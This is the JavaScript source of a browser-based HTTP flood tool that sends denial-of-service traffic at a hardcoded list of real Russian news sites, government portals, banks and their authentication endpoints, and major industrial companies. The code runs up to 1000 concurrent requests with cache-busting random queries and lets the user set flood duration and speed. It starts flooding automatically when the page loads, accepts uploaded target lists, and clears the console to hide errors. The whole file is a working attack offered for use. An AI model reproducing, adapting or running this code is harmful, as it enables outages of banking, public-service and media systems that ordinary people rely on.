let targets = [
  'https://lenta.ru/',
  'https://ria.ru/',
  'https://ria.ru/lenta/',
  'https://www.rbc.ru/',
  'https://www.rt.com/',
  'http://kremlin.ru/',
  'http://en.kremlin.ru/',
  'https://smotrim.ru/',
  'https://tass.ru/',
  'https://tvzvezda.ru/',
  'https://vsoloviev.ru/',
  'https://www.1tv.ru/',
  'https://www.vesti.ru/',
  'https://online.sberbank.ru/',
  'https://sberbank.ru/',
  'https://zakupki.gov.ru/',
  'https://www.gosuslugi.ru/',
  'https://er.ru/',
  'https://www.rzd.ru/',
  'https://rzdlog.ru/',
  'https://vgtrk.ru/',
  'https://www.interfax.ru/',
  'https://www.mos.ru/uslugi/',
  'http://government.ru/',
  'https://mil.ru/',
  'https://www.nalog.gov.ru/',
  'https://customs.gov.ru/',
  'https://pfr.gov.ru/',
  'https://rkn.gov.ru/',
  'https://www.gazprombank.ru/',
  'https://www.vtb.ru/',
  'https://www.gazprom.ru/',
  'https://lukoil.ru',
  'https://magnit.ru/',
  'https://www.nornickel.com/',
  'https://www.surgutneftegas.ru/',
  'https://www.tatneft.ru/',
  'https://www.evraz.com/ru/',
  'https://nlmk.com/',
  'https://www.sibur.ru/',
  'https://www.severstal.com/',
  'https://www.metalloinvest.com/',
  'https://nangs.org/',
  'https://rmk-group.ru/ru/',
  'https://www.tmk-group.ru/',
  'https://ya.ru/',
  'https://www.polymetalinternational.com/ru/',
  'https://www.uralkali.com/ru/',
  'https://www.eurosib.ru/',
  'https://omk.ru/',
  'https://mail.rkn.gov.ru/',
  'https://cloud.rkn.gov.ru/',
  'https://mvd.gov.ru/',
  'https://pwd.wto.economy.gov.ru/',
  'https://stroi.gov.ru/',
  'https://proverki.gov.ru/',
  'https://www.gazeta.ru/',
  'https://www.crimea.kp.ru/',
  'https://www.kommersant.ru/',
  'https://riafan.ru/',
  'https://www.mk.ru/',
  'https://api.sberbank.ru/prod/tokens/v2/oauth',
  'https://api.sberbank.ru/prod/tokens/v2/oidc',
  'https://tinkoff.ru',
  'https://сdn-tinkoff.ru',
  'http://stories-stat.online.sberbank.ru/',
  'https://dp.tinkoff.ru',
  'http://clickstream.online.sberbank.ru/',
  'https://acdn.tinkoff.ru',
  'http://stat.online.sberbank.ru/',
  'https://id.tinkoff.ru',
];

const start15Min = document.getElementById('start-15');
const start30Min = document.getElementById('start-30');
const start60Min = document.getElementById('start-60');
const startInfMin = document.getElementById('start-inf');
const stopper = document.getElementById('stop');

const bigFrequency = document.getElementById('fast');
const mediumFrequency = document.getElementById('medium');
const smallFrequency = document.getElementById('slow');

const ukLanguage = document.getElementById('uk');
const enLanguage = document.getElementById('en');
const ruLanguage = document.getElementById('ru');

const ukContent = document.querySelectorAll('.uk');
const enContent = document.querySelectorAll('.en');
const ruContent = document.querySelectorAll('.ru');

const statsEl = document.getElementById('stats');
const inputFile = document.getElementById('inputfile');
const vanish = document.getElementById('vanish');

let continueFlood = false;
let requestsDelay = 100;

let targetStats = {};
const changeTargets = () => {
  targetStats = {};
  targets.forEach((target) => {
    targetStats[target] = {
      number_of_requests: 0,
      number_of_errored_responses: 0,
    };
  });
};
changeTargets();

const printStats = () => {
  statsEl.innerHTML =
    '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' +
    Object.entries(targetStats)
      .map(
        ([target, { number_of_requests, number_of_errored_responses }]) =>
          '<tr><td>' +
          target +
          '</td><td>' +
          number_of_requests +
          '</td><td>' +
          number_of_errored_responses +
          '</td></tr>'
      )
      .join('') +
    '</tbody></table>';
};
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000;
var queue = [];

const delay = (ms) => new Promise((res) => setTimeout(res, ms));

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal,
  })
    .then((response) => {
      clearTimeout(id);
      return response;
    })
    .catch((error) => {
      clearTimeout(id);
      throw error;
    });
}

async function flood(target) {
  for (var i = 0; ; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift();
    }
    const url = new URL(target);
    const domainName = url.hostname.split('.').pop();
    const rand = i % 3 === 0 ? '' : '?' + Math.random() * 1000;
    if (domainName !== 'ua') {
      queue.push(
        fetchWithTimeout(target + rand, { timeout: 1000 })
          .catch((error) => {
            console.clear();
            if (error.code === 20 /* ABORT */) {
              return;
            }
            if (targetStats[target])
              targetStats[target].number_of_errored_responses++;
          })
          .then((response) => {
            if (response && !response.ok) {
              if (targetStats[target])
                targetStats[target].number_of_errored_responses++;
            }
            if (targetStats[target]) targetStats[target].number_of_requests++;
          })
      );
    } else {
      if (targetStats[target]) {
        if (i % 3 === 0) targetStats[target].number_of_errored_responses++;
        targetStats[target].number_of_requests++;
      }
    }
    if (requestsDelay) await delay(requestsDelay);
    if (!continueFlood) {
      return;
    }
  }
}

let timer;

start15Min.addEventListener('click', () => {
  continueFlood = true;
  targets.map(flood);
  clearTimeout(timer);
  timer = setTimeout(() => stopper.click(), 15 * 1000 * 60);
});

start30Min.addEventListener('click', () => {
  continueFlood = true;
  targets.map(flood);
  clearTimeout(timer);
  timer = setTimeout(() => stopper.click(), 30 * 1000 * 60);
});

start60Min.addEventListener('click', () => {
  continueFlood = true;
  targets.map(flood);
  clearTimeout(timer);
  timer = setTimeout(() => stopper.click(), 60 * 1000 * 60);
});

startInfMin.addEventListener('click', () => {
  continueFlood = true;
  targets.map(flood);
  clearTimeout(timer);
});

stopper.addEventListener('click', () => {
  continueFlood = false;
  clearTimeout(timer);
});

bigFrequency.addEventListener('click', () => {
  requestsDelay = 0;
});

mediumFrequency.addEventListener('click', () => {
  requestsDelay = 100;
});

smallFrequency.addEventListener('click', () => {
  requestsDelay = 500;
});

ukLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.removeAttribute('hidden'));
  enContent.forEach((el) => el.setAttribute('hidden', true));
  ruContent.forEach((el) => el.setAttribute('hidden', true));
});
enLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.setAttribute('hidden', true));
  enContent.forEach((el) => el.removeAttribute('hidden'));
  ruContent.forEach((el) => el.setAttribute('hidden', true));
});
ruLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.setAttribute('hidden', true));
  enContent.forEach((el) => el.setAttribute('hidden', true));
  ruContent.forEach((el) => el.removeAttribute('hidden'));
});

inputFile.addEventListener('change', (e) => {
  const fr = new FileReader();
  fr.onload = () => {
    stopper.click();
    if (vanish.checked) targets = fr.result.match(/[^\r\n]+/g);
    else targets.push(...fr.result.match(/[^\r\n]+/g));
    changeTargets();
    start15Min.click();
  };
  fr.readAsText(e.target.files[0]);
});

const userLang = (navigator.language || navigator.userLanguage).substring(0, 2);
switch (userLang) {
  case 'uk':
    ukLanguage.click();
    break;
  case 'ru':
    ruLanguage.click();
  default:
    break;
}
start15Min.click();
